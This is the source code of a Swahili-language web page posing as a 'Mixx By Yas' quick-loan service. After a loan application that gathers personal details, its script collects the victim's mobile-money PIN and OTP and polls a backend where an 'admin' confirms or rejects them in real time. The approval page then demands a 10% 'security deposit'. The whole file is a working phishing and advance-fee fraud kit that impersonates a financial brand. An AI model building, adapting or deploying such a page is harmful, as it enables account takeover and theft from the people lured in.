...
<title>Mixx By Yas Tanzania – Mikopo ya Haraka na Rahisi</title>
...
<style>
  :root {
    ...
    --teal: #FFD200;
    --purple: #FFA800;
    --grad: linear-gradient(to right, #FFD200, #FFA800);
    --page-bg: #EBEBEB;
    --white: #FFFFFF;
    --text-dark: #152060;
    --text-mid: #444;
  ...
  * { box-sizing: border-box; margin: 0; padding: 0; }
  ...
  .dot-1{background:#FFD200;} .dot-2{background:#152060;} .dot-3{background:#FFD200;} .dot-4{background:#152060;}
  ...
  /* BUTTONS */
  .btn-grad { background:var(--grad); color:#152060; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
  ...
  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,210,0,0.18); }
  ...
  .calc-row2 .cv { color:var(--navy); font-weight:600; }
  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,#FFD200 0%,#FFD200 var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--teal); border:3px solid #fff; box-shadow:0 2px 6px rgba(255,210,0,0.5); cursor:pointer; }
  ...
  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--navy); }
  ...
  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,210,0,0.35)} 50%{box-shadow:0 0 0 16px rgba(255,210,0,0)} }
  ...
  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,210,0,0.18); }
  ...
  .btn-login.rdy { background:var(--grad); color:#152060; }
  ...
  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,210,0,0.18); }
  .otp-resend { font-size:0.8rem; color:var(--navy); margin-bottom:22px; }
  ...
  .btn-otp.rdy { background:var(--grad); color:#152060; }
  ...
  /* ───── PAGE 8: APPROVAL ───── */
  #page-approval { background:linear-gradient(135deg,#152060 0%,#1a2e7a 50%,#0D1540 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
  ...
  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,#FFD200,#FFA800); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(255,210,0,0.5); }
  ...
  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; color:#152060; }
  .appr-banner .abl { font-size:0.72rem; color:rgba(21,32,96,0.75); text-transform:uppercase; letter-spacing:0.06em; }
  .appr-banner .aba { font-size:2rem; font-weight:700; color:#152060; }
  ...
  .ic-g{background:linear-gradient(135deg,#FFD200,#FFA800);}
  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9);}
  .ic-p{background:linear-gradient(135deg,#1a2e7a,#152060);}
  ...
  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#152060; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; }
  ...
  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #fff3b0; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
...
<div id="page-landing" class="page active">
  <nav class="land-nav">
    ...
    <div class="logo-group">
      <div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div>
  ...
  <div class="land-center">
    <div class="land-card">
      ...
      <p class="land-tagline">Idhini ya haraka • Viwango bora • Masharti ya kubadilika</p>

      <div class="calc-box">
        <h2>Kikokotoo cha Mkopo</h2>
        <div class="calc-row2"><span>Kiasi cha Mkopo</span><span class="cv" id="aDisp">Tsh 1,000,000</span></div>
        <input type="range" id="rA" min="50000" max="50000000" step="50000" value="1000000" oninput="calcUp()" style="--pct:9.9%">
        <div class="range-ends"><span>Tsh 50,000</span><span>Tsh 50,000,000</span></div>
        <div class="calc-row2"><span>Muda wa Mkopo</span><span class="cv" id="tDisp">12 months</span></div>
        <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
        <div class="range-ends"><span>6 months</span><span>60 months</span></div>
        <div class="monthly-box">
          <span class="ml">Malipo ya Kila Mwezi</span>
          <span class="ma" id="mOut">Tsh 104,166.67</span>
        </div>
      </div>
...
<div id="page-step1" class="page">
  <nav class="navbar">
    <a class="nav-left" onclick="goTo('page-landing')">← Rudi</a>
    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
  ...
  <div class="step-center">
    <div class="step-card">
      ...
      <div class="field"><label>Kiasi cha Mkopo (Tsh)</label><input type="number" id="s1am" value="1000000" placeholder="Ingiza kiasi" oninput="clearErr('s1Err')"></div>
      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>Miezi 36</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
      <div class="field"><label>Madhumuni ya Mkopo</label><textarea id="s1pu" placeholder="Elezea madhumuni ya mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
...
<div id="page-step2" class="page">
  <nav class="navbar">
    <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
  </nav>
  <div class="step-center">
    <div class="step-card">
      ...
      <div class="field-row">
        ...
        <div class="field"><label>Jina la Familia</label><input type="text" id="s2la" placeholder="Jina la Familia" oninput="clearErr('s2Err')"></div>
      </div>
      <div class="field"><label>Barua Pepe</label><input type="email" id="s2em" placeholder="barua@pepe.com" oninput="clearErr('s2Err')"></div>
      <div class="field">
        ...
        <div class="field-hint">Ingiza tarakimu 9 au anza na 0 (mf., 0712345678 → inabadilishwa kiotomatiki kuwa 712345678)</div>
      </div>
      <div class="step-btns">
        <button class="btn-gray" onclick="goTo('page-step1')">ILIYOPITA</button>
...
<div id="page-step3" class="page">
  <nav class="navbar">
    <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">Mixx By Yas</div></div>
    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
  </nav>
  <div class="step-center">
    <div class="step-card">
      ...
      <div class="field"><label>Hali ya Ajira</label><div class="sel-wrap"><select id="s3em"><option>Mwajiriwa</option><option selected>Mfanyabiashara</option><option>Asiye na Kazi</option><option>Mstaafu</option><option>Mwanafunzi</option></select></div></div>
      <div class="field"><label>Mapato ya Mwaka (Tsh)</label><input type="number" id="s3in" placeholder="Ingiza mapato ya mwaka" oninput="clearErr('s3Err')"></div>
      <div class="sum-box">
        <h3>Muhtasari wa Ombi</h3>
        <div class="sum-row"><span class="sk">Kiasi cha Mkopo:</span><span class="sv" id="sA">Tsh 1,000,000</span></div>
        <div class="sum-row"><span class="sk">Muda wa Mkopo:</span><span class="sv" id="sT">48 Months</span></div>
        <div class="sum-row"><span class="sk">Madhumuni:</span><span class="sv" id="sP">—</span></div>
        <div class="sum-row"><span class="sk">Mwomba:</span><span class="sv" id="sN">—</span></div>
      </div>
      <div class="step-btns">
        <button class="btn-gray" onclick="goTo('page-step2')">ILIYOPITA</button>
...
<div id="page-submitted" class="page">
  <div class="sub-wrap">
    ...
    <p>Ombi lako la mkopo limewasilishwa. Tafadhali subiri uthibitisho.<br>Utapokea ujumbe wa kuthibitisha. Kwa sasa, endelea kwenye Mixx By Yas.</p>
    <div class="redir-pill">🔄 Inaelekeza kwenye kuingia kwa Mixx By Yas katika <span class="redir-n" id="rdN">3</span>s...</div><br>
    <button class="btn-go" onclick="goTo('page-login')">Nenda kwenye Kuingia Sasa</button>
  </div>
</div>
...
<div id="page-login" class="page">
  <div class="login-hdr">
    <div class="logo-group">
      <div class="logo-dots" style="width:36px;height:36px;"><span class="dot-1" style="width:15px;height:15px;"></span><span class="dot-2" style="width:15px;height:15px;"></span><span class="dot-3" style="width:15px;height:15px;"></span><span class="dot-4" style="width:15px;height:15px;"></span></div>
      <div class="logo-text" style="font-size:1.5rem;">Mixx By Yas</div>
      <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
    </div>
  </div>
  <div class="login-body-wrap">
    ...
    <div class="login-inner">
      ...
      <div class="pin-label">Ingiza PIN yako (herufi 4)</div>
      <div class="pin-row">
  ...
  <div class="lg-curve">
    <div class="lg-foot">
      <div class="logo-group">
        <div class="logo-dots" style="width:32px;height:32px;"><span class="dot-1" style="width:13px;height:13px;"></span><span class="dot-2" style="width:13px;height:13px;"></span><span class="dot-3" style="width:13px;height:13px;"></span><span class="dot-4" style="width:13px;height:13px;"></span></div>
        <div class="logo-text">Mixx By Yas</div>
        <div class="logo-sub">Mikopo ya Haraka na Rahisi</div>
      </div>
      <div class="lg-version">v2.1.3P</div>
      <div class="lg-terms">Kwa kuingia, unakubali <a href="#">Masharti na Hali</a></div>
    </div>
  </div>
</div>
...
<div id="page-otp" class="page">
  <div class="otp-topbar">
    ...
    <div style="display:flex;align-items:center;gap:8px;">
      <div class="logo-dots" style="width:22px;height:22px;"><span class="dot-1" style="width:9px;height:9px;"></span><span class="dot-2" style="width:9px;height:9px;"></span><span class="dot-3" style="width:9px;height:9px;"></span><span class="dot-4" style="width:9px;height:9px;"></span></div>
      <div class="logo-text">Mixx By Yas</div>
    </div>
  ...
  <div class="otp-body-wrap">
    <div class="otp-card">
      ...
      <p class="otp-hint">Ingiza OTP iliyotumwa kwenye nambari yako ya simu</p>
      ...
      <div class="waiting-box" id="pinWait">
        ...
        <p>Subiri uthibitisho wa maelezo yako…</p>
      </div>
      ...
      <div id="otpInputSection">
        ...
        <div class="otp-resend" id="otpRs">Tuma tena msimbo katika sekunde <span id="rsS">17</span></div>
...
<div id="page-approval" class="page">
  <div class="appr-wrap">
    <div class="appr-top">
      ...
      <div class="appr-sub">Mkopo wako umeidhinishwa! Fedha zitatumwa hivi karibuni.</div>
      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">Tsh 1,000,000</div></div>
    </div>
    <div class="comp-box">
      <div class="ch">⚠️ TAARIFA YA UZINGATIAJI</div>
      <p>Akaunti yako ya Mixx By Yas lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi chako cha mkopo kilichoombwa.</strong> Amana hii inarejeshwa kikamilifu baada ya kulipa mkopo na husaidia kupata viwango bora vya riba.</p>
    </div>
    <div class="ld-card">
      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">Tsh 27.5</div></div></div>
      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
    ...
    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapokea SMS na barua pepe yenye maelezo ya kutuma fedha ndani ya masaa 24.</p></div>
...
<div class="overlay" id="mLogin">
  <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitishaji</p></div>
</div>
<div class="overlay" id="mOtp">
  <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Tafadhali subiri… (3s)</p></div>
</div>
<div class="overlay" id="mSubmit">
  <div class="modal"><div class="spinner"></div><h3>Inawasilisha Ombi…</h3><p>Tafadhali subiri huku tunashughulikia ombi lako</p></div>
</div>
...
<script>
  ...
  // ══════════════════════════════════════════════════════
  // ══════════════════════════════════════════════════════
  // RESET ALL — clears every field and state when user
  // returns to landing or login from a completed/cancelled flow
  // ══════════════════════════════════════════════════════
  function resetAll() {
    // Stop all polling & timers
    if (typeof pinPollInterval !== 'undefined' && pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
    if (typeof otpPollInterval !== 'undefined' && otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
    if (typeof _rsInterval     !== 'undefined' && _rsInterval)     { clearInterval(_rsInterval);     _rsInterval = null; }
    ...
    // Clear loan application form (steps 1-3)
    ['s1am','s1pu','s2fi','s2la','s2em','s2ph','s3in'].forEach(function(id) {
      var el = document.getElementById(id); if (el) el.value = '';
    });
    // Reset selects to defaults
    var s1ty = document.getElementById('s1ty'); if (s1ty) s1ty.selectedIndex = 1;
    var s1te = document.getElementById('s1te'); if (s1te) s1te.selectedIndex = 5;
    var s3em = document.getElementById('s3em'); if (s3em) s3em.selectedIndex = 1;
    // Clear step error messages
    ['s1Err','s2Err','s3Err'].forEach(function(id) { var el = document.getElementById(id); if (el) el.classList.remove('show'); });

    // Clear login page
    var lgPh = document.getElementById('lgPh'); if (lgPh) lgPh.value = '';
    [0,1,2,3].forEach(function(i) { var el = document.getElementById('p'+i); if (el) el.value = ''; });
    var bLogin = document.getElementById('bLogin');
    if (bLogin) { bLogin.className = 'btn-login'; bLogin.disabled = false; }
    var lgMsg = document.getElementById('lgMsg'); if (lgMsg) lgMsg.classList.remove('show');

    // Clear OTP page
    [0,1,2,3].forEach(function(i) { var el = document.getElementById('o'+i); if (el) el.value = ''; });
    var bOtp = document.getElementById('bOtp');
    if (bOtp) { bOtp.className = 'btn-otp'; bOtp.disabled = false; }
    // Hide waiting spinner, show OTP input section
    var pinWait = document.getElementById('pinWait'); if (pinWait) pinWait.classList.remove('show');
    var otpSec  = document.getElementById('otpInputSection'); if (otpSec) otpSec.style.display = '';
    // Reset resend countdown text
    var otpRs = document.getElementById('otpRs');
    if (otpRs) otpRs.innerHTML = 'Tuma tena msimbo katika sekunde <span id="rsS">60</span>';
    // Hide OTP messages
    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(function(id) { var el = document.getElementById(id); if (el) el.classList.remove('show'); });

    // Reset loan calculator to defaults
    var rA = document.getElementById('rA'); if (rA) rA.value = 1000000;
    var rT = document.getElementById('rT'); if (rT) rT.value = 12;
    calcUp();
  }
  ...
  // ══════════════════════════════════════════════════════
  function goTo(id) {
    // Clear all data when navigating back to landing or login page
    if (id === 'page-landing' || id === 'page-login') resetAll();
  ...
  function calcUp() {
    ...
    document.getElementById('aDisp').textContent = 'Tsh ' + a.toLocaleString();
    document.getElementById('tDisp').textContent = t + ' months';
    document.getElementById('mOut').textContent = 'Tsh ' + m.toFixed(2);
    document.getElementById('rA').style.setProperty('--pct', ((a-50000)/(50000000-50000)*100).toFixed(1) + '%');
  ...
  // STEP NAVIGATION
  // ══════════════════════════════════════════════════════
  // Normalize phone: strip leading 0 so +255 prefix works correctly
  ...
  function toS2() {
    ...
    if (!amt || Number(amt) <= 0) {
      showErr('s1Err', 'Tafadhali ingiza kiasi halali cha mkopo.');
      shakeField('s1am'); return;
    }
    if (!purpose) {
      showErr('s1Err', 'Tafadhali elezea madhumuni ya mkopo wako.');
  ...
  function toS3() {
    ...
    const email = document.getElementById('s2em').value.trim();
    const phone = document.getElementById('s2ph').value.trim();
    if (!first) { showErr('s2Err', 'Tafadhali ingiza jina lako la kwanza.'); shakeField('s2fi'); return; }
    if (!last)  { showErr('s2Err', 'Tafadhali ingiza jina lako la familia.');  shakeField('s2la'); return; }
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      showErr('s2Err', 'Tafadhali ingiza anwani sahihi ya barua pepe.'); shakeField('s2em'); return;
    }
    if (!phone || phone.length < 9) {
      showErr('s2Err', 'Tafadhali ingiza nambari sahihi ya simu ya tarakimu 9.'); shakeField('s2ph'); return;
    }
    clearErr('s2Err');
    S.first = first; S.last = last; S.phone = phone;
    document.getElementById('sA').textContent = 'Tsh ' + Number(S.amt).toLocaleString();
  ...
  function submitApp() {
    ...
    if (!income || Number(income) <= 0) {
      showErr('s3Err', 'Tafadhali ingiza mapato yako ya mwaka.'); shakeField('s3in'); return;
    }
    clearErr('s3Err');
  ...
  async function doLogin() {
    ...
    if (!rawPhone || pin.length < 4) {
      showLoginMsg('Tafadhali ingiza nambari yako ya simu na PIN ya tarakimu 4.');
      return;
    }
    ...
    try {
      ...
      if (data.success) {
        ...
        showLoginMsg(data.message || 'Uthibitishaji umeshindwa. Tafadhali jaribu tena.');
      }
    ...
    pinPollInterval = setInterval(async () => {
      try {
        ...
        if (data.status === 'approved') {
          ...
          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali ingiza OTP yako hapa chini.');
          startRs();
    ...
    setTimeout(() => {
      if (pinPollInterval) {
        ...
        if (document.getElementById('pinWait').classList.contains('show')) {
          document.getElementById('pinWait').classList.remove('show');
          showOtpMsg('warning', 'Muda wa uthibitishaji umekwisha. Tafadhali rudi na ujaribu tena.');
        }
      }
    }, 300000);
  }
  ...
  function startRs() {
    ...
    rsBox.innerHTML = 'Tuma tena msimbo katika sekunde <span id="rsS">' + s + '</span>';
    ...
    _rsInterval = setInterval(() => {
      ...
      if (s <= 0) {
        ...
        if (box) box.innerHTML = '<span style="color:var(--navy);cursor:pointer;font-weight:600" onclick="resendOtp()">Tuma tena msimbo</span>';
      }
    }, 1000);
  }
  ...
  async function resendOtp() {
    ...
    try {
      ...
      const data = await res.json();
      if (data.success) {
        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa admin.');
        startRs();
        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
        document.getElementById('bOtp').className = 'btn-otp';
        document.getElementById('o0').focus();
      } else {
        showOtpMsg('error', 'Imeshindwa kutuma tena OTP. Tafadhali jaribu tena.');
      }
    } catch {
  ...
  async function doOtp() {
    ...
    if (otp.length < 4) {
      showOtpMsg('warning', 'Tafadhali ingiza tarakimu zote 4 za OTP yako.');
      return;
    }
    ...
    let c = 3;
    document.getElementById('otpVT').textContent = 'Tafadhali subiri… (' + c + 's)';
    ...
    const countdown = setInterval(() => {
      ...
      if (el) el.textContent = 'Tafadhali subiri… (' + c + 's)';
    }, 1000);
    ...
    try {
      ...
      if (data.success) {
        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri admin kuidhinisha…');
        pollOtpStatus();
      } else {
    ...
    otpPollInterval = setInterval(async () => {
      try {
        ...
        if (data.status === 'approved') {
          ...
          // Update approval page with loan details
          document.getElementById('apAmt').textContent  = 'Tsh ' + Number(S.amt || 1000000).toLocaleString();
          document.getElementById('apTerm').textContent = S.term || '48 Months';
          // Calculate monthly payment for display
          const a = Number(S.amt) || 1000;
          const t = parseInt(S.term) || 48;
          const r = 0.08 / 12;
          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
          document.getElementById('apMthly').textContent = 'Tsh ' + m.toFixed(2);
          goTo('page-approval');

        } else if (data.status === 'rejected') {
          clearInterval(otpPollInterval);
          showOtpMsg('error', 'Uthibitishaji umeshindwa. Tafadhali wasiliana na msaada.');
          document.getElementById('bOtp').disabled = false;

        } else if (data.status === 'wrongpin_otp') {
          // Admin flagged PIN as wrong — send user back to login
          clearInterval(otpPollInterval);
          showOtpMsg('error', 'PIN si sahihi imegunduliwa. Inaelekeza kwenye kuingia…');
          setTimeout(() => {
            // Clear PIN boxes
            ...
            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo katika sekunde <span id="rsS">60</span>';
          ...
          document.getElementById('bOtp').className = 'btn-otp';
          document.getElementById('bOtp').disabled = false;
          showOtpMsg('error', 'Msimbo wa OTP si sahihi. Tafadhali angalia na uingize tena.');
          document.getElementById('o0').focus();
        }
        // status === 'pending' → keep polling
